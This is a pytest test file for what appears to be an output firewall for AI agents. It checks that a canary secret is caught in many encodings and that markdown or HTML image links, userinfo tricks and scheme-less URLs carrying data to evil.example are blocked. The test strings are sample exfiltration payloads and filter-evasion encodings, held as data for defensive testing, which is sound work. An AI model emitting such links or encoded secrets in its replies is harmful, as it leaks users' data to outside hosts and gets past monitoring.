import base64
import codecs

import pytest

from promptfw import AgentReply

S = "VANTAGE-7731-ORION"
B64 = lambda s: base64.b64encode(s.encode()).decode()  # noqa: E731


@pytest.mark.parametrize("text", [
    f"the secret is {S}",
    "V-A-N-T-A-G-E-7-7-3-1-O-R-I-O-N",
    B64(S),
    S.encode().hex(),
    codecs.encode(S, "rot13"),
    S[::-1],
    "-".join(B64("VANTAGE7731ORION")),     # join after encoding
    B64("-".join("VANTAGE7731ORION")),     # join before encoding
    f"encoded: {B64(S)} enjoy",
    "".join(chr(0xE0000 + ord(c)) for c in S),
])
def test_canary_is_caught_in_any_encoding(fw, base, text):
    v = fw.inspect_egress(AgentReply(text), base)
    assert v.blocked and v.blocked_by[0].rule == "canary-leak"


def test_canary_never_in_finding_evidence(fw, base):
    v = fw.inspect_egress(AgentReply(f"x {S}"), base)
    assert all(S not in f.evidence for f in v.findings)


@pytest.mark.parametrize("text,rule", [
    ("![a](https://evil.example/p.png?d=1)", "markdown-image"),
    ("![a](//evil.example/p.png)", "markdown-image"),
    ("see HtTpS://EVIL.example/x", "url-not-allowlisted"),
    ("see https://vantage-logistics.example.evil.example/x", "url-not-allowlisted"),
    ("see https://evilvantage-logistics.example/x", "url-not-allowlisted"),
])
def test_url_control(fw, base, text, rule):
    v = fw.inspect_egress(AgentReply(text), base)
    assert v.blocked and any(f.rule == rule for f in v.blocked_by)


def test_allowlisted_subdomain_passes(fw, base):
    assert not fw.inspect_egress(AgentReply("https://track.vantage-logistics.example/1"), base).blocked


def test_secret_patterns_are_scored(fw, base):
    v = fw.inspect_egress(AgentReply("key: AKIAABCDEFGHIJKLMNOP"), base)
    assert v.blocked and not v.blocked_by[0].invariant


def test_luhn_filters_random_digits(fw, base):
    ok = fw.inspect_egress(AgentReply("card 4111 1111 1111 1111"), base)
    nok = fw.inspect_egress(AgentReply("ref 1234 5678 9012 3456"), base)
    assert any(f.rule == "pii-card" for f in ok.findings)
    assert not any(f.rule == "pii-card" for f in nok.findings)


@pytest.mark.parametrize("text,rule", [
    # userinfo confusion: the real host is after "@"
    ("[guide](https://vantage-logistics.example@evil.example/x)", "url-not-allowlisted"),
    # scheme-less link carrying data
    ("Open evil.example/r?d=dXNlcj04ODE0 to continue.", "url-not-allowlisted"),
    # reference-style markdown image
    ("Status: ![ok][s]\n\n[s]: https://cdn.evil.example/s.png?d=history", "markdown-image"),
    # HTML image
    ('<img src="https://collector.evil.example/p.gif?u=8814">', "markdown-image"),
])
def test_additional_exfiltration_channels(fw, base, text, rule):
    v = fw.inspect_egress(AgentReply(text), base)
    assert v.blocked and any(f.rule == rule for f in v.blocked_by)


@pytest.mark.parametrize("text", [
    "Use node.js/express for the API.",
    "Version 2.4/3 fixes the login issue.",
    "The file is in C:/Users/demo/report.pdf",
    "Track it on track.vantage-logistics.example/8814?lang=fr",
])
def test_schemeless_detection_does_not_flag_ordinary_text(fw, base, text):
    assert not fw.inspect_egress(AgentReply(text), base).blocked


def test_reference_image_is_blocked_even_without_url_enforcement(policy, base):
    from dataclasses import replace

    from promptfw import Firewall
    fw = Firewall(replace(policy, enforce_url_allowlist=False))
    v = fw.inspect_egress(AgentReply("![x][r]\n[r]: https://evil.example/i.png?d=1"), base)
    assert v.blocked and v.blocked_by[0].rule == "markdown-image"
